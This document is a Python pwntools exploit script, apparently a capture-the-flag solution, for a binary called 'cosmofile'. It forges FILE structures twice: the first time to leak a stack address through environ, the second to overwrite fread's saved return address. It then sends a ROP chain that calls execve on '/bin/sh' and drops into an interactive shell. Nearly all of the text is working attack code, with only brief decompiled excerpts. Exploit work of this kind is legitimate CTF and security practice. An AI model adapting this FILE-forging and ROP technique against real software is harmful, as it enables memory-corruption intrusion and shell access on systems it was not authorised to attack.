#!/usr/bin/env python3

from pwn import *

# rev the fread_unlocked function

exe = ELF('./cosmofile')
# libc = ELF('')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

'''
call fread unlock
call readv
'''

script = '''
b *0x40CC6D 
b *0x40CD66
'''

p = process("./cosmofile")
#p = gdb.debug('./cosmofile', gdbscript = script)

# modify FILE structure to leak
sa(b"> ", f"{0x6e7472}".encode())

'''
  v9 = count * (unsigned __int128)stride;
...
  if ( !(_QWORD)v9 )
    return 0LL;
  v13 = end - beg;
  if ( v13 >= (unsigned __int64)v9 )
  {
    nb = v9;
    memmove(buf, &f->buf[beg], v9);
    v32 = f->beg + nb;
    f->beg = v32;
    if ( v32 == f->end )
      *(_QWORD *)&f->beg = 0LL;
    return count;
  }
'''

environ = 0x446058
fp = p8(0) # bufmode
fp += p8(1) # freethis
fp += p8(1) # freebuf
fp += p8(0) # forking
fp += p32(0x242) # oflags
fp += p32(0) # state
fp += p32(3) # fd
fp += p32(0) # pid
fp += p32(0) # refs
fp += p32(0x1000) # size
fp += p32(0) # beg
fp += p32(0x1000) # end
fp += p32(0) # padding
fp += p64(environ - 0xff8) # buf
## -0xff8 to prevent copy from unmap address
sa(b"secret...\n", fp)

# leak main rsp
sa(b"> ", b"1")
rcu(b"Content of cosmofile:\n")
rsp = u64(p.recvn(0x1000)[-8::]) - 0x1048
lleak("rsp", rsp)

# modify FILE structure to arb write
sa(b"> ", f"{0x6e7472}".encode())

'''
  v11 = v9;
...
  if ( f->bufmode == 2 || (size = f->size, v11 >= size) )
  {
    size = 0LL;
    v17 = 0LL;
  }
  else
  {
    v17 = f->buf;
    if ( (unsigned int)size > 0xC )
      size = (unsigned int)(size - 12);
  }
  iov[1].iov_base = v17;
  iov[1].iov_len = size;
  v18 = 2;
  v19 = iov;
'''

fp = p8(0) # bufmode
fp += p8(1) # freethis
fp += p8(1) # freebuf
fp += p8(0) # forking
fp += p32(0x242) # oflags
fp += p32(0) # state
fp += p32(0) # fd
fp += p32(0) # pid
fp += p32(0) # refs
fp += p32(0x1000 + 1) # size
fp += p32(0) # beg
fp += p32(0) # end
fp += p32(0) # padding
fp += p64(rsp - 8) # buf
## buf = fread saved rip
## fd = 1, size > v9
sa(b"secret...\n", fp)

# attack fread saved rip, write ROP chain
sa(b"> ", b"1")

pop_rdi_rbp = 0x00000000004010b7
pop_rsi_rbp = 0x0000000000401e1b
pop_rdx_rbx_rbp = 0x0000000000427748
mov_qword_ptr_rdi_rsi = 0x0000000000411dfc
pop_rax = 0x000000000040bdf5
syscall = 0x0000000000401899

rop = p64(pop_rdi_rbp) + p64(rsp - 0x10) + p64(0)
rop += p64(pop_rsi_rbp) + b"/bin/sh\x00" + p64(0)
rop += p64(mov_qword_ptr_rdi_rsi)
rop += p64(pop_rsi_rbp) + p64(0) * 2
rop += p64(pop_rdx_rbx_rbp) + p64(0) * 3
rop += p64(pop_rax) + p64(59)
rop += p64(syscall) 

payload = b"A" * 0x1000 # padding for the iov[0].buf
payload += rop # rop chain start from iov[1].buf (= fread saved rip)
#payload += b"B" * 8
sa(b"Reading from cosmofile:\n", payload)

p.interactive()
